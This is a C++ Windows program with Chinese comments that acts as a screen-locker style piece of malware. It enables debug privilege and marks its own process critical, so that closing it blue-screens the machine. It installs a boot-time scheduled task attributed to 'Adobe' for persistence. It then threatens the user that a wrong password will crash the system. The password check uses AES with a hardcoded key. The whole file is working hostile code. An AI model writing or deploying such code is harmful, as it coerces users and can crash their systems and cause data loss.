#pragma warning(disable:4996)
#include <cstdio>
#include <iostream>
#include <windows.h>
#include "CMyTaskSchedule.h"
#include "AES.h"
#include "Base64.h"
using namespace std;
bool EnableDebugPrivilege();
string EncryptionAES(const string& strSrc);//ASE加密
string DecryptionAES(const string& strSrc);//AES解密

typedef NTSTATUS(__cdecl* fnRtlSetProcessIsCritical)(IN  BOOLEAN  NewValue, OUT PBOOLEAN OldValue OPTIONAL, IN  BOOLEAN  CheckFlag);
fnRtlSetProcessIsCritical pRtlSetProcessIsCritical;
string pass = "JEZ/WBNS1zey48EQlffE5g==";//加密后的密码

//秘钥
const char g_key[17] = "shficnrkshfkrhsh";
const char g_iv[17] = "qodjshfnfjnfhjd";//ECB MODE不需要关心chain，可以填空

int main(void)
{
	CMyTaskSchedule CMy;
	
	//提升为系统进程
	EnableDebugPrivilege();

	HMODULE  hNtdll = GetModuleHandle(TEXT("ntdll.dll"));
	if (hNtdll)
	{
		pRtlSetProcessIsCritical = (fnRtlSetProcessIsCritical)GetProcAddress(hNtdll, "RtlSetProcessIsCritical");
		if (pRtlSetProcessIsCritical)
		{
			pRtlSetProcessIsCritical(TRUE, NULL, FALSE);
		}
	}


	//开机自启动
	CHAR path[MAX_PATH];
	HMODULE hm = GetModuleHandle(NULL);
	GetModuleFileName(hm, path, sizeof(path));
	char start[200] = { 0 };
	char name[5] = "Task";
	char p[18] = "TASK_TRIGGER_BOOT";
	char writer[10] = "Adobe";
	CMy.NewTask(name, path, p, writer);
	//sprintf(start, "schtasks /create /tn \"Hello\" /tr %s /sc ONLOGON /rl highest /f", path);//创建计划任务
	//system("schtasks /delete /tn \"Hello\" /f");
	//system(start);
	//system("cls");
	
	//密码验证
	string in;
	cout << "请输入密码，输错蓝屏!" << endl;
	cout << "不要尝试关闭程序" << endl;
	cin >> in;
	//string x = EncryptionAES(in);
	if (pass == EncryptionAES(in))
	{
		if (pRtlSetProcessIsCritical)
		{
			pRtlSetProcessIsCritical(FALSE, NULL, FALSE);
		}
		CMy.Delete(name);
		//system("schtasks /delete /tn \"Hello\" /f");
		return 0;
	}
	else
	{
		CMy.NewTask(name, path, p, writer);
		return 0;
	}
	
}


bool EnableDebugPrivilege()//提升为系统进程
{
	HANDLE hToken;
	LUID sedebugnameValue;
	TOKEN_PRIVILEGES tkp;
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
	{
		return   false;
	}
	if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &sedebugnameValue))
	{
		CloseHandle(hToken);
		return false;
	}
	tkp.PrivilegeCount = 1;
	tkp.Privileges[0].Luid = sedebugnameValue;
	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	if (!AdjustTokenPrivileges(hToken, FALSE, &tkp, sizeof(tkp), NULL, NULL))
	{
		CloseHandle(hToken);
		return false;
	}
	return true;
}

string EncryptionAES(const string& strSrc) //AES加密
{
	size_t length = strSrc.length();
	int block_num = length / BLOCK_SIZE + 1;
	//明文
	char* szDataIn = new char[block_num * BLOCK_SIZE + 1];
	memset(szDataIn, 0x00, block_num * BLOCK_SIZE + 1);
	strcpy(szDataIn, strSrc.c_str());

	//进行PKCS7Padding填充。
	int k = length % BLOCK_SIZE;
	int j = length / BLOCK_SIZE;
	int padding = BLOCK_SIZE - k;
	for (int i = 0; i < padding; i++)
	{
		szDataIn[j * BLOCK_SIZE + k + i] = padding;
	}
	szDataIn[block_num * BLOCK_SIZE] = '\0';

	//加密后的密文
	char* szDataOut = new char[block_num * BLOCK_SIZE + 1];
	memset(szDataOut, 0, block_num * BLOCK_SIZE + 1);

	//进行进行AES的CBC模式加密
	AES aes;
	aes.MakeKey(g_key, g_iv, 16, 16);
	aes.Encrypt(szDataIn, szDataOut, block_num * BLOCK_SIZE, AES::CBC);
	string str = base64_encode((unsigned char*)szDataOut,
		block_num * BLOCK_SIZE);
	delete[] szDataIn;
	delete[] szDataOut;
	return str;
}
string DecryptionAES(const string& strSrc) //AES解密
{
	string strData = base64_decode(strSrc);
	size_t length = strData.length();
	//密文
	char* szDataIn = new char[length + 1];
	memcpy(szDataIn, strData.c_str(), length + 1);
	//明文
	char* szDataOut = new char[length + 1];
	memcpy(szDataOut, strData.c_str(), length + 1);

	//进行AES的CBC模式解密
	AES aes;
	aes.MakeKey(g_key, g_iv, 16, 16);
	aes.Decrypt(szDataIn, szDataOut, length, AES::CBC);

	//去PKCS7Padding填充
	if (0x00 < szDataOut[length - 1] <= 0x16)
	{
		int tmp = szDataOut[length - 1];
		for (int i = length - 1; i >= length - tmp; i--)
		{
			if (szDataOut[i] != tmp)
			{
				memset(szDataOut, 0, length);
				cout << "去填充失败！解密出错！！" << endl;
				break;
			}
			else
				szDataOut[i] = 0;
		}
	}
	string strDest(szDataOut);
	delete[] szDataIn;
	delete[] szDataOut;
	return strDest;
}